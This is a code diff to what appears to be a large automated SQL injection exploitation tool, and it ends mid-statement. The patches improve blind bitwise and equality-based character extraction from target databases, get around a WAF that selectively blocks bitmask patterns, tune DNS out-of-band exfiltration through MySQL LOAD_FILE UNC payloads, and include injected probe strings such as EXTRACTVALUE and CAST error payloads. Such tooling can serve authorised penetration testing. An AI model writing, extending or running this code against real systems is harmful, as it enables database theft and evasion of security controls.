@@ -49993,6 +49993,17 @@ class OOBDetector:
                     # any subsequent cross-tech PCV has a sensible starting point.
                     if not getattr(self.config, '_pcv_timing_threshold', 0):
                         self.config._pcv_timing_threshold = 2000.0  # 2s conservative OOB threshold
+                    # BUG-OOB-FILE-PRIV-TRACK FIX: If the successful payload uses LOAD_FILE
+                    # (MySQL/MariaDB UNC DNS exfil), cache FILE privilege confirmation on config
+                    # so downstream extraction can skip LOAD_FILE UNC payloads when privilege
+                    # was never proven. Without this, AdvancedDNSExfil sends LOAD_FILE UNC probes
+                    # that silently return NULL when FILE privilege is absent — zero DNS hits, no
+                    # extracted data, no error logged.
+                    if 'LOAD_FILE' in payload.upper():
+                        try:
+                            self.config._oob_has_file_priv = True
+                        except Exception:
+                            pass
                     return DetectionResult(param=param,technique="O",payload=payload,dbms=dbms,
                                            confidence=0.99,notes=f"oob_dns domain={domain}")
         return None
@@ -57980,6 +57991,59 @@ class Scanner:
             _high_none = sum(1 for m in _none_bits_still_none if m >= 128)
             if _high_none >= 1:
                 return None  # any unresolved high-order bit makes the char value unreliable
+
+            # BUG-EXTRACT-CHAR-BITWISE-WAF-SELECTIVE-PER-CHAR FIX (Fix 7, CRITICAL):
+            # The global `_bitwise_oracle_sane` pre-check detects WAF selective mask blocking
+            # before the extraction loop. However, WAF behavior can be inconsistent across
+            # character positions (some targets only block specific conditions or apply rate-
+            # dependent blocking). When WAF blocking occurs per-position but not globally, the
+            # sanity check passes but individual characters are corrupted.
+            # Detection: after assembling _val, if ALL hex-'8' masks within _n_bits have their
+            # bits set in _val, the character is suspicious (hex-'8' WAF blocking pattern).
+            # chr(0x88888) observed in production: all bits 3,7,11,15,19 set simultaneously.
+            # For these suspicious values, run an equality-verification probe. If the equality
+            # probe denies _val, strip hex-'8' bits and try equality again. Return None if
+            # verification fails so the caller routes to _fallback_equality.
+            _bw_hex8_masks_char = [1<<b for b in range(_n_bits) if '8' in hex(1<<b)]
+            if _bw_hex8_masks_char and _val > 0:
+                _bw_hex8_sum_char = sum(_bw_hex8_masks_char)
+                # All hex-8 bits in range are set → suspicious WAF blocking pattern
+                _bw_char_all_hex8_set = ((_val & _bw_hex8_sum_char) == _bw_hex8_sum_char)
+                # Also check supplementary-plane range (code point > 0xFFFF is always garbage)
+                _bw_char_supplementary = (_val > 0xFFFF and _n_bits <= 21)
+                if _bw_char_all_hex8_set or _bw_char_supplementary:
+                    # Verify via equality probe (only = operator, never WAF-blocked)
+                    if _dbms == "Oracle":
+                        _char_eq_cond = f"BITAND({_ascii_fn},{_val & 0xFFFF})=({_val & 0xFFFF})"
+                    else:
+                        _char_eq_cond = f"({_ascii_fn})={_val}"
+                    _char_eq_r = await _cached_eval(_char_eq_cond)
+                    if _char_eq_r is False:
+                        # Equality denies _val — WAF selective blocking confirmed for this position
+                        _val_stripped = _val & ~_bw_hex8_sum_char
+                        if _val_stripped >= 32:
+                            _char_eq_strip_cond = f"({_ascii_fn})={_val_stripped}"
+                            _char_eq_strip_r = await _cached_eval(_char_eq_strip_cond)
+                            if _char_eq_strip_r is True:
+                                LOG.debug("[Inference] pos=%d bitwise WAF-selective fix: "
+                                          "stripped hex-8 bits %d→%d", pos, _val, _val_stripped)
+                                _val = _val_stripped
+                            else:
+                                LOG.debug("[Inference] pos=%d bitwise WAF-selective: "
+                                          "equality denies both %d and stripped %d → None",
+                                          pos, _val, _val_stripped)
+                                return None
+                        else:
+                            LOG.debug("[Inference] pos=%d bitwise WAF-selective: "
+                                      "equality denies %d, stripped=%d not printable → None",
+                                      pos, _val, _val_stripped)
+                            return None
+                    elif _char_eq_r is None:
+                        # Equality ambiguous — fall through conservatively (BROAD-4XX)
+                        # Don't reject confirmed bit assembly if equality is indeterminate
+                        pass
+                    # _char_eq_r is True → val confirmed, proceed normally
+
             # BUG-BITWISE-UNICODE-HI FIX: was `32 <= _val <= 255` — the 255 cap discarded
             # all non-Latin-1 Unicode characters (code points 256-65535 for MSSQL/Sybase,
             # 256-1114111 for SQLite) as None.  MSSQL/Sybase use UNICODE() which returns
@@ -58038,10 +58102,66 @@ class Scanner:
             else:
                 _len_fn = f"LENGTH(({query}))"
 
+            # BUG-BITWISE-LEN-WAF-SANITY FIX (CRITICAL): Before the bit loop, probe an
+            # always-false condition using mask=8 (the primary Imperva WAF-blocked pattern).
+            # x&8=1 is always SQL-false (x&8 is either 0 or 8, never 1). If the oracle
+            # returns True, WAF is selectively blocking hex-'8' mask patterns and returning
+            # HTTP 400 (True oracle status) for them. All length bits using masks containing
+            # hex digit '8' (8, 128 for 10-bit extraction) will be incorrectly set, producing
+            # garbage lengths like 257 (true=1), 546 (true=...), 273, 272, 68, 34 observed
+            # in the production log. When detected, skip WAF-blocked masks in the bit loop
+            # and recover their values using equality probes (= operator, never blocked).
+            _len_waf_blocked_hex8 = False
+            _len_blocked_masks_set = set()
+            try:
+                _len_san_cond_m8 = None
+                if _dbms == "Oracle":
+                    _len_san_cond_m8 = f"BITAND({_len_fn},8)=1"
+                elif _dbms == "Firebird":
+                    _len_san_cond_m8 = f"BIN_AND({_len_fn},8)=1"
+                elif _dbms in ("DB2", "Sybase"):
+                    _len_san_cond_m8 = f"BITAND({_len_fn},8)=1"
+                elif _dbms == "ClickHouse":
+                    _len_san_cond_m8 = f"bitAnd({_len_fn},8)=1"
+                else:
+                    _len_san_cond_m8 = f"{_len_fn}&8=1"
+                _len_san_r = await _eval(_len_san_cond_m8)
+                if _len_san_r is True:
+                    # Always-false condition returned True → WAF blocks hex-'8' masks.
+                    # Build the set of WAF-blocked masks for this bit range.
+                    _len_waf_blocked_hex8 = True
+                    _len_blocked_masks_set = {m for b in range(max_bits)
+                                              for m in [1 << b]
+                                              if any(c in hex(m) for c in ('8',))}
+                    LOG.warning("[Inference] _get_length_bitwise: WAF selectively blocks "
+                                "hex-'8' bitmask patterns in length probes (always-false "
+                                "&8=1 returned True). Blocked masks for %d-bit extraction: %s. "
+                                "Will recover blocked bits via equality probes.",
+                                max_bits, sorted(_len_blocked_masks_set))
+                elif _len_san_r is None:
+                    # Sanity probe ambiguous — also treat as potential WAF blocking
+                    # (x&8=1 is always false; None instead of False means oracle
+                    # can't evaluate this mask pattern, same symptom as WAF blocking).
+                    _len_waf_blocked_hex8 = True
+                    _len_blocked_masks_set = {m for b in range(max_bits)
+                                              for m in [1 << b]
+                                              if any(c in hex(m) for c in ('8',))}
+                    LOG.warning("[Inference] _get_length_bitwise: WAF selective-mask "
+                                "sanity probe (&8=1) returned None (ambiguous). "
+                                "Treating hex-'8' masks as potentially blocked. "
+                                "Blocked masks: %s", sorted(_len_blocked_masks_set))
+            except Exception as _len_san_exc:
+                LOG.debug("[Inference] _get_length_bitwise sanity probe error (non-fatal): %s",
+                          _len_san_exc)
+
             _val = 0
             _none_count = 0
             for bit in range(max_bits - 1, -1, -1):
                 _mask = 1 << bit
+                # BUG-BITWISE-LEN-WAF-SANITY FIX: Skip WAF-blocked hex-'8' masks in the
+                # main bit loop; recover their values after the loop using equality probes.
+                if _len_waf_blocked_hex8 and _mask in _len_blocked_masks_set:
+                    continue  # skip — will recover via equality probe after the loop
                 if _dbms == "Oracle":
                     _cond = f"BITAND({_len_fn},{_mask})={_mask}"
                 elif _dbms == "Firebird":
@@ -58084,10 +58204,94 @@ class Scanner:
                 if r is True:
                     _val |= _mask
                 await asyncio.sleep(_delay * 0.5)
+
+            # BUG-BITWISE-LEN-WAF-RECOVERY FIX: Recover WAF-blocked hex-'8' bits using
+            # equality probes (= operator). For each blocked mask, probe whether the
+            # length has that bit set by checking (len_fn % (mask*2)) = mask (bit-3 set)
+            # vs (len_fn % (mask*2)) = 0 (bit-3 clear). This uses only = and % operators;
+            # WAFs that block & patterns virtually never block arithmetic modulo or equality.
+            # Alternative approach: use the partial _val already computed (without blocked
+            # bits) plus binary scan of the blocked-bit contribution:
+            #   For bit b (mask M=2^b): length has bit b set iff (length >> b) & 1 = 1.
+            #   Probe: (len_fn % (M*2)) >= M (uses >=, might be blocked)
+            #   Safer: probe a range of possible lengths with equality:
+            #     Candidate lengths are _val + {0, M, 128, M+128} (for M=8, 128 in 10-bit).
+            #     Use equality probe len_fn = candidate to identify the true length.
+            if _len_waf_blocked_hex8 and _len_blocked_masks_set:
+                _blocked_sorted = sorted(_len_blocked_masks_set)  # ascending order
+                # Generate all 2^n candidate length values (where n = number of blocked masks)
+                # by OR-ing blocked masks into _val in all combinations.
+                _candidates = [_val]
+                for _bm in _blocked_sorted:
+                    _candidates = [c for pair in ((_c, _c | _bm) for _c in _candidates)
+                                   for c in pair]
+                # Probe each candidate with equality until we find a match.
+                _len_eq_found = False
+                for _cand in sorted(set(_candidates)):  # try smallest first (conservative)
+                    if _cand <= 0:
+                        continue
+                    _eq_cond = f"{_len_fn}={_cand}"
+                    _eq_r = await _eval(_eq_cond)
+                    if _eq_r is True:
+                        LOG.info("[Inference] _get_length_bitwise: equality probe confirmed "
+                                 "length=%d (raw bitwise was %d, blocked masks=%s)",
+                                 _cand, _val, sorted(_len_blocked_masks_set))
+                        _val = _cand
+                        _len_eq_found = True
+                        break
+                    await asyncio.sleep(_delay * 0.3)
+                if not _len_eq_found and _candidates:
+                    # No equality probe matched — oracle ambiguous; return raw partial value
+                    # (conservative, possibly underestimated) or -1 if raw value is 0.
+                    LOG.warning("[Inference] _get_length_bitwise: equality recovery failed "
+                                "(no candidate matched). Using raw partial value=%d. "
+                                "Extraction may be shorter than actual string.", _val)
+                    if _val <= 0:
+                        return -1
+
             # If too many bits were unresolvable (> 40% None after retries), the oracle
             # is too unstable to trust — return -1 so the caller falls back to max_len.
             if _none_count > max_bits * 0.4:
                 return -1
+
+            # BUG-BITWISE-LEN-EQUALITY-VERIFY FIX (HIGH): Even when no WAF blocking was
+            # detected by the sanity probe, verify the computed _val using an equality probe.
+            # This catches cases where WAF selectively blocked some masks (producing garbage
+            # lengths like 257 instead of 1) that the sanity probe missed, as well as
+            # transient bit-flips from oracle instability. The equality probe uses only the
+            # = operator (never blocked) and costs one extra HTTP request per extraction.
+            # Only run when _val is in a suspicious range (> 100 or has hex-'8' pattern).
+            _hex8_mask_sum = sum(m for b in range(max_bits) for m in [1 << b]
+                                 if any(c in hex(m) for c in ('8',)))
+            if _val > 0 and not _len_waf_blocked_hex8:
+                _val_is_suspicious = (
+                    _val > 200 or                          # unusually long for usernames/db names
+                    (_val & _hex8_mask_sum) == _hex8_mask_sum and _val > 100  # all hex-8 bits set
+                )
+                if _val_is_suspicious:
+                    _eq_verify_cond = f"{_len_fn}={_val}"
+                    _eq_verify_r = await _eval(_eq_verify_cond)
+                    if _eq_verify_r is False:
+                        # _val is wrong; try stripping hex-'8' bits
+                        _val_stripped = _val & ~_hex8_mask_sum
+                        if _val_stripped != _val and _val_stripped > 0:
+                            _eq_strip_cond = f"{_len_fn}={_val_stripped}"
+                            _eq_strip_r = await _eval(_eq_strip_cond)
+                            if _eq_strip_r is True:
+                                LOG.info("[Inference] _get_length_bitwise: equality verify "
+                                         "corrected WAF-corrupted length %d → %d "
+                                         "(hex-8 bits stripped)", _val, _val_stripped)
+                                _val = _val_stripped
+                            else:
+                                LOG.warning("[Inference] _get_length_bitwise: suspicious length "
+                                            "%d failed equality verify and stripped value %d also "
+                                            "failed — returning -1", _val, _val_stripped)
+                                return -1
+                        else:
+                            LOG.warning("[Inference] _get_length_bitwise: suspicious length "
+                                        "%d failed equality verify — returning -1", _val)
+                            return -1
+
             return _val if _val > 0 else -1  # -1 signals "unknown" (all bits zero = suspicious)
 
         def _is_garbage(text):
@@ -59897,6 +60101,62 @@ class Scanner:
                             else:
                                 # Results agree — use the smaller (conservative) estimate
                                 _length = min(_length, _length2)
+                                # BUG-BITWISE-LENGTH-IDENTICAL-GARBAGE FIX (CRITICAL, Fix 5):
+                                # Stability "agree" branch passes when BOTH runs return the SAME
+                                # garbage value (e.g., both return 257 when true length is 1).
+                                # Consistently WAF-blocked hex-'8' bits (mask=8, 128 in 10-bit)
+                                # always set → same garbage both times → ratio=0 ≤ 0.20 → "agree".
+                                # _get_length_bitwise.equality_verify only fires for _val > 200
+                                # and returns the value unchanged when the equality probe returns
+                                # None (BROAD-4XX ambiguous). That leaves post-stability identical
+                                # garbage undetected.
+                                # Fix: after stability "agree", if the agreed value is suspicious,
+                                # run a direct equality probe to verify. On mismatch strip hex-'8'
+                                # bits and re-verify. This uses only = operator (never WAF-blocked).
+                                _bw_hex8_masks_stab = [1<<b for b in range(10) if '8' in hex(1<<b)]
+                                _bw_hex8_sum_stab = sum(_bw_hex8_masks_stab)
+                                _len_suspicious_stab = (
+                                    _length > 200 or
+                                    (_length > 50 and (_length & _bw_hex8_sum_stab) == _bw_hex8_sum_stab)
+                                )
+                                if _len_suspicious_stab:
+                                    # Recompute DBMS length fn (mirrors _get_length_bitwise._len_fn)
+                                    if _dbms == "MSSQL":
+                                        _stab_len_fn = (
+                                            f"ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),"
+                                            f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({query})))))/2,"
+                                            f"ISNULL(LEN(CONVERT(NVARCHAR(MAX),"
+                                            f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({query}))))),0))"
+                                        )
+                                    elif _dbms == "Sybase":
+                                        _stab_len_fn = f"LEN((SELECT TOP 1 CONVERT(VARCHAR(8000),({query}))))"
+                                    elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                                        _stab_len_fn = f"CHAR_LENGTH(({query}))"
+                                    elif _dbms in ("Firebird", "Oracle"):
+                                        _stab_len_fn = f"LENGTHC(({query}))"
+                                    else:
+                                        _stab_len_fn = f"LENGTH(({query}))"
+                                    _stab_eq_r = await _eval(f"{_stab_len_fn}={_length}")
+                                    if _stab_eq_r is False:
+                                        # Agreed value is verifiably wrong — try hex-'8' stripped
+                                        _stab_stripped = _length & ~_bw_hex8_sum_stab
+                                        if _stab_stripped > 0 and _stab_stripped != _length:
+                                            _stab_eq2_r = await _eval(f"{_stab_len_fn}={_stab_stripped}")
+                                            if _stab_eq2_r is True:
+                                                LOG.warning("[Inference] %s: stability identical-garbage "
+                                                            "corrected %d → %d (hex-8 bits stripped)",
+                                                            label, _length, _stab_stripped)
+                                                _length = _stab_stripped
+                                            else:
+                                                LOG.warning("[Inference] %s: stability: both %d and "
+                                                            "stripped %d failed equality — capping to "
+                                                            "max_len=%d", label, _length, _stab_stripped, max_len)
+                                                _length = min(_length, max_len)
+                                        else:
+                                            LOG.warning("[Inference] %s: stability: agreed suspicious "
+                                                        "length %d failed equality verify — capping to "
+                                                        "max_len=%d", label, _length, max_len)
+                                            _length = min(_length, max_len)
                         else:
                             # Second run failed — oracle may be degraded; cap to max_len
                             _length = min(_length, max_len)
@@ -59969,22 +60229,69 @@ class Scanner:
                 # say True → cap is correct.  A healthy oracle with a real max_len-length
                 # string will say False → no cap.
                 if _length >= max_len and max_len >= 64:
-                    _over_mid = (max_len + 1 if (">=" in _len_tpl or "BETWEEN" in _len_tpl.upper()
-                                                  or ("NOT" in _len_tpl.upper() and "<{mid}" in _len_tpl))
-                                 else max_len)
-                    _over_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid))
-                    _oracle_beyond = await _eval_confirm(_over_cond)  # Use confirmation for reliability
-                    if _oracle_beyond is True:
-                        # Oracle claims length > max_len → definitely stuck at ceiling
-                        LOG.warning("[Inference] %s: length=%d hit max_len ceiling and "
-                                    "oracle confirms beyond-ceiling → oracle unreliable, "
-                                    "capping at 32", label, _length)
-                        _length = 32  # reasonable cap for db/user/version values
+                    if _use_bitwise_fallback:
+                        # BUG-MAXLEN-CAP-BITWISE-FALLBACK FIX (Fix 6, CRITICAL):
+                        # When _use_bitwise_fallback=True, _len_tpl uses comparison operators
+                        # (> or BETWEEN) that the WAF has already blocked. Evaluating _over_cond
+                        # against the blocked _len_tpl returns None (BROAD-4XX ambiguous) →
+                        # `_oracle_beyond is True` is False → no cap fires → garbage lengths pass.
+                        # Fix: construct an equality-based ceiling check using the same DBMS-aware
+                        # length function that _get_length_bitwise uses (only & and = operators).
+                        # Probe: length_fn = _length (verify the bitwise result is accurate).
+                        # If False → length is wrong, cap conservatively.
+                        # If True  → length is verified, keep it.
+                        # If None  → ambiguous (BROAD-4XX); assume suspicious, cap to max_len.
+                        if _dbms == "MSSQL":
+                            _cap_len_fn = (
+                                f"ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),"
+                                f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({query})))))/2,"
+                                f"ISNULL(LEN(CONVERT(NVARCHAR(MAX),"
+                                f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({query}))))),0))"
+                            )
+                        elif _dbms == "Sybase":
+                            _cap_len_fn = f"LEN((SELECT TOP 1 CONVERT(VARCHAR(8000),({query}))))"
+                        elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+                            _cap_len_fn = f"CHAR_LENGTH(({query}))"
+                        elif _dbms in ("Firebird", "Oracle"):
+                            _cap_len_fn = f"LENGTHC(({query}))"
+                        else:
+                            _cap_len_fn = f"LENGTH(({query}))"
+                        _cap_verify_cond = f"{_cap_len_fn}={_length}"
+                        _cap_verify_r = await _eval(_cap_verify_cond)
+                        if _cap_verify_r is True:
+                            # Bitwise length matches equality probe → real length, keep it
+                            LOG.info("[Inference] %s: bitwise length=%d equals max_len and "
+                                     "equality probe confirms it is correct (not ceiling garbage)",
+                                     label, _length)
+                        elif _cap_verify_r is False:
+                            # Bitwise length is definitely wrong → cap conservatively
+                            LOG.warning("[Inference] %s: bitwise length=%d hit max_len ceiling "
+                                        "and equality probe DENIES it → oracle unreliable, "
+                                        "capping at 32", label, _length)
+                            _length = 32
+                        else:
+                            # Equality probe ambiguous (None) — conservatively cap to max_len
+                            LOG.warning("[Inference] %s: bitwise length=%d hit max_len ceiling, "
+                                        "equality probe ambiguous (None) — capping to max_len=%d",
+                                        label, _length, max_len)
+                            _length = min(_length, max_len)
                     else:
-                        # Oracle says NOT beyond max_len → real boundary, keep max_len
-                        LOG.info("[Inference] %s: length=%d equals max_len but oracle "
-                                 "confirms this is the true length (not a dead ceiling)",
-                                 label, _length)
+                        _over_mid = (max_len + 1 if (">=" in _len_tpl or "BETWEEN" in _len_tpl.upper()
+                                                      or ("NOT" in _len_tpl.upper() and "<{mid}" in _len_tpl))
+                                     else max_len)
+                        _over_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_over_mid))
+                        _oracle_beyond = await _eval_confirm(_over_cond)  # Use confirmation for reliability
+                        if _oracle_beyond is True:
+                            # Oracle claims length > max_len → definitely stuck at ceiling
+                            LOG.warning("[Inference] %s: length=%d hit max_len ceiling and "
+                                        "oracle confirms beyond-ceiling → oracle unreliable, "
+                                        "capping at 32", label, _length)
+                            _length = 32  # reasonable cap for db/user/version values
+                        else:
+                            # Oracle says NOT beyond max_len → real boundary, keep max_len
+                            LOG.info("[Inference] %s: length=%d equals max_len but oracle "
+                                     "confirms this is the true length (not a dead ceiling)",
+                                     label, _length)
                 LOG.info("[Inference] %s: length=%d", label, _length)
                 max_len = _length
             else:
@@ -60198,15 +60505,73 @@ class Scanner:
                            and v not in range(48, 58)
                            and v not in (95, 45, 46, 47, 64, 32)
                            and v not in _latin1_common])
+                # BUG-FALLBACK-EQUALITY-NONE-RESILIENCE FIX (CRITICAL):
+                # Root cause: On True=400 oracles (where the app legitimately returns 400
+                # for True SQL conditions), equality probes for the CORRECT candidate also
+                # receive status 400. The BROAD-4XX guard fires (both probe and calibration-
+                # True are 4xx), then SimHash comparison runs \u2014 if gap < 0.05 (bodies too
+                # similar) the guard returns None. The old code immediately returned None as
+                # "oracle dead", aborting the entire equality fallback even though only the
+                # True candidate is ambiguous; all False candidates correctly return False
+                # (200-class status \u2192 BROAD-4XX doesn't fire).
+                #
+                # Fix strategy: collect all ambiguous (None) candidates during the scan,
+                # keep probing remaining candidates. After exhausting the ordered list:
+                #   1. If exactly one candidate was ambiguous \u2192 it is the True case (all
+                #      other candidates returned False; only the correct char is ambiguous
+                #      because only it produces a True SQL condition \u2192 True oracle status).
+                #   2. If multiple candidates were ambiguous \u2192 retry each with single-probe
+                #      _eval (not _eval_confirm) to avoid CDN triple-probe caching issues;
+                #      return the first that gives True.
+                #   3. Consecutive-None streak guard: if 30+ sequential None results, the
+                #      oracle is genuinely unresponsive \u2192 return None (oracle dead).
+                _fe_ambiguous = []   # candidates that returned None (potentially True)
+                _fe_none_streak = 0  # consecutive None counter (oracle-dead detection)
                 for _val in _order:
                     _cond = f"({_ae})={_val}"
                     _r = await _eval_confirm(_cond)
                     if _r is None:
-                        return None  # oracle dead
+                        # BUG-FALLBACK-EQUALITY-NONE-RESILIENCE FIX: Do NOT immediately
+                        # abort. Record ambiguous candidate and continue scanning.
+                        _fe_ambiguous.append(_val)
+                        _fe_none_streak += 1
+                        if _fe_none_streak >= 30:
+                            # 30+ consecutive None: oracle genuinely unresponsive.
+                            LOG.warning("[Inference] %s: _fallback_equality oracle dead "
+                                        "(30 consecutive None at pos=%d), aborting.", label, p)
+                            return None
+                        await asyncio.sleep(_delay * 0.5)
+                        continue
+                    _fe_none_streak = 0  # reset streak on any concrete answer
                     if _r:
                         LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                         return chr(_val)
                     await asyncio.sleep(_delay * 0.3)
+                # --- Post-scan ambiguity resolution ---
+                if len(_fe_ambiguous) == 1:
+                    # Exactly one candidate was ambiguous and all others returned False.
+                    # On True=400 oracles only the SQL-True condition triggers BROAD-4XX
+                    # ambiguity; False conditions give a distinct non-4xx response. Single
+                    # ambiguous candidate is overwhelmingly likely to be the correct char.
+                    _val = _fe_ambiguous[0]
+                    LOG.info("[Inference] pos=%d equality (single-ambiguous) \u2192 %r "
+                             "(val=%d)", p, chr(_val), _val)
+                    return chr(_val)
+                if len(_fe_ambiguous) > 1:
+                    # Multiple ambiguous candidates \u2014 retry each with single-probe _eval
+                    # (avoids CDN triple-probe cache interference that _eval_confirm has).
+                    for _val in _fe_ambiguous:
+                        _cond = f"({_ae})={_val}"
+                        _r_retry = None
+                        for _fe_attempt in range(3):
+                            _r_retry = await _eval(_cond)
+                            if _r_retry is not None:
+                                break
+                            await asyncio.sleep(_delay)
+                        if _r_retry is True:
+                            LOG.info("[Inference] pos=%d equality (ambiguous-retry) \u2192 %r "
+                                     "(val=%d)", p, chr(_val), _val)
+                            return chr(_val)
                 return None
 
             # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX (CRITICAL): Before starting bitwise
@@ -60296,6 +60661,29 @@ class Scanner:
                                         "(affected masks: 8, 128, 2048, 32768, 524288). "
                                         "Switching to equality scan.", label)
                             _bitwise_oracle_sane = False
+                        elif _bw_san_m8 is None and _bw_san_r is not None:
+                            # BUG-BITWISE-SANITY-M8-NONE FIX (CRITICAL): Primary probe (mask=0)
+                            # resolved correctly (returned True or False), but secondary probe
+                            # (mask=8) returned None \u2014 BROAD-4XX guard fired but SimHash gap was
+                            # < 0.05 (WAF error body not clearly similar to either calibration
+                            # response, so the oracle couldn't discriminate). Since x&8=1 is
+                            # always SQL-false, the correct oracle response is False. Getting None
+                            # instead of False means the probe was ambiguous \u2014 consistent with WAF
+                            # selectively blocking the mask=8 pattern and returning a 400 response
+                            # whose body falls between the True=400 calibration body and False=404
+                            # calibration body in SimHash space. The primary probe (mask=0) was
+                            # NOT blocked (mask=0 contains no hex '8'), confirming the blocking
+                            # is SELECTIVE to the mask=8 hex pattern. During actual bitwise
+                            # extraction, all hex-'8' masks (8, 128, 2048, 32768, 524288) will
+                            # similarly return None-or-misclassified True, causing those bits to
+                            # be set incorrectly and producing garbage supplementary-plane chars
+                            # (chr(0x88888) observed in production log). Switch to equality scan.
+                            LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED "
+                                        "(selective-mask: &8=1 returned None; mask=0 probe was %s). "
+                                        "WAF differentially blocks hex-digit-8 bitmask patterns; "
+                                        "BROAD-4XX guard cannot discriminate WAF-block from SQL-True "
+                                        "for these masks. Switching to equality scan.", label, _bw_san_r)
+                            _bitwise_oracle_sane = False
                     if _bitwise_oracle_sane and _bw_san_r is None:
                         # PRIMARY probe ambiguous (blocked). Verify oracle health with always-true probe.
                         if _dbms == "Oracle":
@@ -60356,12 +60744,23 @@ class Scanner:
                         continue
                     _bwch = await _extract_char_bitwise(query, pos)
                     if _bwch is None:
-                        _consecutive_fails += 1
-                        if _consecutive_fails >= 3:
-                            LOG.warning("[Inference] %s: bitwise fallback failed at pos=%d, stopping",
-                                        label, pos)
-                            break
-                        continue
+                        # BUG-BITWISE-PER-CHAR-FALLBACK-EQUALITY FIX (Fix 7 downstream):
+                        # _extract_char_bitwise returns None when per-character WAF selective
+                        # blocking is detected (all hex-'8' bits set and equality verify fails).
+                        # The global _bitwise_oracle_sane check passed, but WAF behavior is
+                        # inconsistent across positions. Before counting this as a failure,
+                        # attempt _fallback_equality for this specific position. This rescues
+                        # positions where bitwise is blocked but equality still works.
+                        _bwch_eq = await _fallback_equality(query, pos)
+                        if _bwch_eq is not None:
+                            _bwch = _bwch_eq
+                        else:
+                            _consecutive_fails += 1
+                            if _consecutive_fails >= 3:
+                                LOG.warning("[Inference] %s: bitwise+equality fallback both failed "
+                                            "at pos=%d, stopping", label, pos)
+                                break
+                            continue
                     _consecutive_fails = 0
                     ch = _bwch
                     result += ch
@@ -64616,10 +65015,31 @@ class Scanner:
             if _oob_host:
                 LOG.info("[SideChannel] DNS OOB extraction  %s", _oob_host)
 
-                #  Advanced DNS exfil (no LOAD_FILE needed) 
+                #  Advanced DNS exfil (no LOAD_FILE needed)
                 if _oob_host and _dbms:
                     _adv_payloads = AdvancedDNSExfil.get_payloads(
                         _dbms, "VERSION()" if _dbms != "MSSQL" else "@@VERSION", _oob_host)
+                    # BUG-OOB-FILE-PRIV FIX: For MySQL/MariaDB, AdvancedDNSExfil only produces
+                    # LOAD_FILE UNC payloads which require MySQL FILE privilege. Without FILE
+                    # privilege, LOAD_FILE returns NULL silently — no DNS query is issued, no
+                    # data exfiltrated, no error is raised. Guard: if the OOB detection that
+                    # fired earlier did NOT use LOAD_FILE (meaning FILE privilege was never
+                    # confirmed in this session), remove LOAD_FILE payloads from the list to
+                    # avoid wasting HTTP requests. The detection payload is in enum.result.
+                    if _dbms in ("MySQL", "MariaDB"):
+                        _oob_file_priv_confirmed = getattr(cfg, '_oob_has_file_priv', False)
+                        if not _oob_file_priv_confirmed:
+                            _det_pay_up = (getattr(getattr(enum, 'result', None), 'payload', '') or '').upper()
+                            if 'LOAD_FILE' in _det_pay_up:
+                                cfg._oob_has_file_priv = True
+                                _oob_file_priv_confirmed = True
+                        if not _oob_file_priv_confirmed:
+                            _adv_payloads_pre = [(n, p) for (n, p) in _adv_payloads if 'LOAD_FILE' not in p.upper()]
+                            if not _adv_payloads_pre:
+                                LOG.warning("[SideChannel] %s OOB: only LOAD_FILE UNC payloads available "
+                                            "but FILE privilege not confirmed by detection — skipping "
+                                            "AdvancedDNSExfil to avoid silent NULL returns", _dbms)
+                            _adv_payloads = _adv_payloads_pre
                     # BUG-DNS-EXFIL-STACK-PREFIX FIX: The old code used
                     # _original_clean + ";" + _adv_p which ignores the injection context.
                     # For string-context injection (WHERE name='test'), the original
@@ -91153,6 +91573,15 @@ class ScannerV10(ScannerV9):
             _norm_base_pcv = ResponseNormaliser.normalise(_bl_pcv_body)
             
             _false_p = _pcv_cascade._make_false_payload(_det_for_pcv.payload) or ""
+            # BUG-PCV-METHOD-MISMATCH FIX (_run_pcv_check path): The function receives
+            # `method` from the caller (scan's HTTP method, e.g. GET). When the detection
+            # payload was delivered via a DIFFERENT method (e.g. PUT header injection),
+            # _safe_confirm with the scan's method re-sends via the wrong HTTP verb, so the
+            # injected payload never reaches the vulnerable parameter. Fix: derive the PCV
+            # confirmation method from _det_for_pcv.method (set by header-injection / alt-
+            # method detectors) and fall back to the scan's `method` only when not set.
+            _pcv_det_method_rpc = (getattr(_det_for_pcv, 'method', None) or '').strip()
+            _pcv_method_rpc = _pcv_det_method_rpc.upper() if _pcv_det_method_rpc else method.upper()
 
             # FIX-R3-RPC: Set _PCV_IN_PROGRESS=True BEFORE setting _SCAN_STOPPED so
             # PCV probes from _run_pcv_check are allowed through _send_injected's stop gate.
@@ -91189,10 +91618,10 @@ class ScannerV10(ScannerV9):
             _SCAN_STOPPED[0] = True       # stop concurrent probe loops while PCV runs
 
             _fp_t = await _pcv_cascade._safe_confirm(
-                method, url, data, data_fmt, param,
+                _pcv_method_rpc, url, data, data_fmt, param,
                 orig + _det_for_pcv.payload, tamper_chain)
             _fp_f = await _pcv_cascade._safe_confirm(
-                method, url, data, data_fmt, param,
+                _pcv_method_rpc, url, data, data_fmt, param,
                 orig + _false_p, tamper_chain) if _false_p else None
 
             # BUG-FIX R3B: Mechanism sniffing for NV/WB/EX/HY/ST techniques.
@@ -95335,8 +95764,13 @@ class DBLogChannelExtractor:
             probes = [
                 f"{_dlc_pfx} AND EXTRACTVALUE(1,CONCAT('SQR_LOG_{marker}'))--",
                 f"{_dlc_pfx} AND 1=CAST('SQR_LOG_{marker}' AS SIGNED)--",
-                f"{_dlc_pfx} UNION SELECT LOAD_FILE('/nonexistent_{marker}')--",
             ]
+            # BUG-OOB-FILE-PRIV FIX: LOAD_FILE('/nonexistent_...') requires MySQL FILE privilege.
+            # Without FILE privilege, LOAD_FILE returns NULL — no error is generated, nothing
+            # is written to the error log, and the HTTP request is wasted. Only include this
+            # probe when FILE privilege was confirmed during the current OOB detection phase.
+            if getattr(self.config, '_oob_has_file_priv', False):
